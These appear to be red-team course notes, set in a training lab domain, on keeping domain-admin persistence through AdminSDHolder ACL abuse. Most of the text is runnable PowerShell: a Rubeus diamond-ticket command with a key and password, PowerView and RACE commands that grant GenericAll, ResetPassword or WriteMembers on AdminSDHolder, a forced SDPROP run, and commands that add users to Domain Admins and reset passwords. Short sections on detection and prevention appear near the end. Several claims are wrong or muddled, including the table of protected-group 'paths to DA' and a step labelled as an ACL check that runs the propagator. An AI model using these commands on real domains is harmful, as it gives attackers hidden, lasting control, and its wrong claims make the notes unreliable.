# Persistence — AdminSDHolder ACL Abuse

**Date:** 06 August 2026

---

## What is AdminSDHolder?

**AdminSDHolder = Admin Security Descriptor Holder**

- Located in System container of domain
- Controls permissions (ACL) for **Protected Groups**
- Protected Groups = built-in privileged groups
- Every hour, **SDPROP** syncs AdminSDHolder ACL to protected groups

---

## Protected Groups & Path to DA

Protected groups automatically get Domain Admin privileges:

| Group | RID | Path to DC |
|---|---|---|
| Account Operators | 548 | → Enterprise Admins → DA |
| Backup Operators | 551 | → Domain Controllers |
| Server Operators | 549 | → Read-Only Domain Controllers |
| Print Operators | 550 | → Schema Admins → DA |
| Domain Admins | 512 | Direct access |

---

## How SDPROP Works

```
AdminSDHolder object
  ↓
SDPROP runs every 60 minutes
  ↓
Compares protected group ACLs with AdminSDHolder ACL
  ↓
Any differences = Overwritten on protected groups
  ↓
User added to AdminSDHolder
  ↓
60 minutes later = User has permission on Domain Admins
```

---

## AdminSDHolder Persistence Attack

**Strategy:** Add user to AdminSDHolder with Full Control.

**Result:** In 60 minutes, user has Full Control on Domain Admins without being member.

---

## Step 1: Get Domain Admin Privileges

Use Diamond Ticket or previous escalation:

```powershell
Rubeus.exe diamond
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
  /user:studentx 
  /password:StudentxPassword 
  /enctype:aes 
  /ticketuser:administrator
  /domain:dollarcorp.moneycorp.local 
  /dc:dcorp-dc.dollarcorp.moneycorp.local
  /ticketuserid:500 
  /groups:512 
  /createnetonly:C:\Windows\System32\cmd.exe 
  /show
  /ptt
```

Now running as Domain Admin.

---

## Step 2: Open Non-Admin Shell for Stealth

```powershell
RunWithRegistryNonAdmin.bat
```

Invisi-Shell for OPSEC (avoid detection).

---

## Step 3: Create Remote Session to DC

```powershell
$sess = New-PSSession -ComputerName dcorp-dc
```

Open PSSession to Domain Controller.

---

## Step 4: Check Current Domain Admins ACLs

```powershell
Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-SDPropagator.ps1

Invoke-Command -ScriptBlock{Invoke-SDPropagator -showprogress -Verbose -timeoutMinutes 1} -Session $sess
```

View Domain Admins ACLs before modification.

---

## Step 5: Add User to AdminSDHolder

**Method 1: PowerView**

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' 
  -PrincipalIdentity student1 
  -Rights All 
  -PrincipalDomain dollarcorp.moneycorp.local 
  -TargetDomain dollarcorp.moneycorp.local 
  -Verbose
```

**Method 2: RACE Toolkit**

```powershell
Set-DCPermissions -Method AdminSDHolder 
  -SAMAccountName student1 
  -Right GenericAll 
  -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' 
  -Verbose
```

**Method 3: Specific Permissions (ResetPassword)**

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' 
  -PrincipalIdentity student1 
  -Rights ResetPassword 
  -PrincipalDomain dollarcorp.moneycorp.local 
  -TargetDomain dollarcorp.moneycorp.local 
  -Verbose
```

**Method 4: WriteMembers Permission**

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' 
  -PrincipalIdentity student1 
  -Rights WriteMembers 
  -PrincipalDomain dollarcorp.moneycorp.local 
  -TargetDomain dollarcorp.moneycorp.local 
  -Verbose
```

---

## Step 6: Trigger SDPROP Manually (Immediate)

**Option 1: Using Invoke-SDPropagator**

```powershell
Invoke-Command -ScriptBlock{Invoke-SDPropagator -showprogress -Verbose -timeoutMinutes 1} -Session $sess
```

**Option 2: Pre-Server 2008**

```powershell
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

Triggers propagation immediately (no 60-minute wait).

---

## Step 7: Verify Persistence

**Check Domain Admins ACL (As normal user)**

**Method 1: PowerView**

```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | 
  ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | 
  ?{$_.IdentityName -match "student1"}
```

**Method 2: ActiveDirectory Module**

```powershell
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | 
  ?{$_.IdentityReference -match 'student1'}
```

**Result:** student1 has FullControl on Domain Admins (without being member).

---

## Step 8: Abuse Permissions

**Abuse FullControl: Add to Domain Admins**

```powershell
# Using PowerView
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

# Using ActiveDirectory Module
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

**Abuse ResetPassword: Change User Password**

```powershell
# Using PowerView
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose

# Using ActiveDirectory Module
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

**Abuse WriteMembers: Modify Group Membership**

```powershell
# Similar to FullControl, can add/remove members
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

---

## Attack Flow

```
1. Get Domain Admin privileges
   ↓
2. Add user to AdminSDHolder with Full Control
   ↓
3. Trigger SDPROP manually (Invoke-SDPropagator)
   ↓
4. User now has Full Control on Domain Admins
   ↓
5. User can add themselves to DA or change passwords
   ↓
6. Persistent domain admin access
```

---

## Permission Options

| Permission | Effect |
|---|---|
| GenericAll / All | Full control (add to group, change password, modify ACL) |
| ResetPassword | Change user password without knowing current password |
| WriteMembers | Add/remove members from group |
| WriteDACL | Modify ACL of object |
| WriteProperty | Modify object properties |

---

## Why AdminSDHolder is Effective

✅ **Persistent** — survives password changes & resets  
✅ **Automatic** — SDPROP applies changes hourly  
✅ **Invisible member** — not actually in DA group  
✅ **Multiple avenues** — Full Control, ResetPassword, WriteMembers  
✅ **Long-term** — works indefinitely until cleaned  

---

## Why AdminSDHolder is Noisy

❌ **Registry changes** — modifying protected groups logged  
❌ **ACL modifications** — tracked in event logs  
❌ **SDPROP execution** — can be monitored  
❌ **Privilege escalation** — flagged by detection tools  

---

## Detection & Prevention

**Detection:**
- Monitor AdminSDHolder ACL changes (event ID 5136)
- Alert on SDPROP execution
- Monitor Domain Admins group ACL modifications
- Check for unusual principals with DA permissions

**Prevention:**
- Restrict AdminSDHolder write access
- Monitor protected group ACLs regularly
- Disable SDPROP (not recommended)
- Use tiered administration (limit DA accounts)
- Regular audit of AdminSDHolder permissions

---

## Command Reference

| Task | Command |
|---|---|
| Add Full Control | `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -Rights All` |
| Add ResetPassword | `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -Rights ResetPassword` |
| Add WriteMembers | `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -Rights WriteMembers` |
| Trigger SDPROP | `Invoke-SDPropagator -timeoutMinutes 1 -showProgress` |
| Check DA ACLs | `Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs` |
| Add to DA | `Add-DomainGroupMember -Identity 'Domain Admins' -Members user` |
| Reset password | `Set-DomainUserPassword -Identity user -AccountPassword $pass` |

---

## AdminSDHolder vs Other Persistence

| Technique | Type | Duration | Detection |
|---|---|---|---|
| AdminSDHolder | ACL-based | Indefinite | Medium |
| Custom SSP | Credential harvesting | Indefinite | Medium |
| DSRM | Local backdoor | Indefinite | Medium |
| Skeleton Key | LSASS patch | Until reboot | High |
| Golden Ticket | Forged TGT | 10+ hours | Low (with evasion) |

---

## Key Takeaway

```
AdminSDHolder = Auto-propagating backdoor
Add user with Full Control to AdminSDHolder
Wait 60 minutes (or trigger SDPROP manually)
User has Full Control on ALL protected groups
Perfect persistence mechanism
```

---

## References

- [PowerView](https://github.com/PowerShellMafia/PowerSploit)
- [RACE Toolkit](https://github.com/samratashok/RACE)
- [AdminSDHolder (Harmj0y)](https://blog.harmj0y.net/redteaming/the-adminsdholder-trick/)

---

*Next: Learning Objective 11 — Cross-Forest Attacks*
